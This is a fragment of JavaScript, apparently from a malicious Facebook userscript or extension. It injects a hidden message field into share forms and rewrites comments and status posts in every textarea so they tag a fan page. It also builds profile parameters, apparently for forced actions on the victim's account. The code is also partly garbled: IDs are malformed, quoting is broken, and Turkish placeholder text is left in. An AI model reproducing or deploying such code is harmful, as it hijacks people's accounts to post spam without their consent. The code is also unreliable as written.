...
if (document.URL.indexOf("sharer.php") >= 0) {
    ...
    document.forms.item(0).innerHTML += "<input type='hidden' autocomplete='off' class='mentionsHidden' name='message' value='@[346260332061476.:Seyhun Sarıoglu FAN Page]'>"; 
...
for (i = 0; i <= document.getElementsByTagName("textarea").length - 1; i++) {
    document.getElementsByTagName("textarea").item(i).setAttribute("onkeydown", "if(this.value.indexOf('@[346260332061476.:Fuck Yeah] ') < 0 && this.name == 'add_comment_text_text'){this.value = '@346260332061476k.:Fuck Yeaah	] ';}");
}
document.addEventListener("click", function () {
    ...
    for (i = 0; i <= document.getElementsByTagName("textarea").length - 1; i++) {
        document.getElementsByTagName("textarea").item(i).setAttribute("onkeydown", "if(this.value.indexOf('@[346260332061476] ') < 0 && this.name == 'add_comment_text_text' || this.name == 'xhpc_message_text' && this.value.indexOf('@[buraya sayfa ıd ' si gelecek.:Seyhun Sarıoglu FAN Page] ') < 0){this.value = '@[burya sayfa ıd si gelcek.:Seyhun Sarıoglu FAN Page] ';}");
    }
    ...
    var params = "profile_id=100003287812438.";
    params += "&location=1";
